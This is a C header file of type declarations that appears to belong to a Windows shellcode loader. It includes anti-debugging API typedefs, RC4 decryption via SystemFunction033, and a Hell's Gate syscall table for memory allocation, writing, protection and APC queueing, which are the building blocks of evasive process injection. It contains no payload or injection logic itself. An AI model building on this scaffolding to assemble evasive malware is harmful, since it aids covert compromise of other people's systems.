#pragma once

// winapi stuff

typedef BOOL(WINAPI* fnCreateProcessA)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef DWORD(WINAPI* fnGetEnvironmentVariableA)(
	LPCSTR lpName,
	LPSTR  lpBuffer,
	DWORD  nSize
	);

typedef BOOL(WINAPI* fnDebugActiveProcessStop)(
	DWORD dwProcessId
);

typedef BOOL(WINAPI* fnIsDebuggerPresent)();

typedef void(WINAPI* fnOutputDebugStringA)(
	LPCSTR lpOutputString
);

typedef void(WINAPI* fnSetLastError)(
	DWORD dwErrCode
);


typedef NTSTATUS(WINAPI* fnNtQueryInformationProcess)(
	HANDLE           ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID            ProcessInformation,
	ULONG            ProcessInformationLength,
	PULONG           ReturnLength
	);

// rc4 stuff

typedef struct
{
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction033)(USTRING* Data, USTRING* Key);

// hell's gate stuff

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtQueueApcThread;
	VX_TABLE_ENTRY NtClose;
} VX_TABLE, * PVX_TABLE;

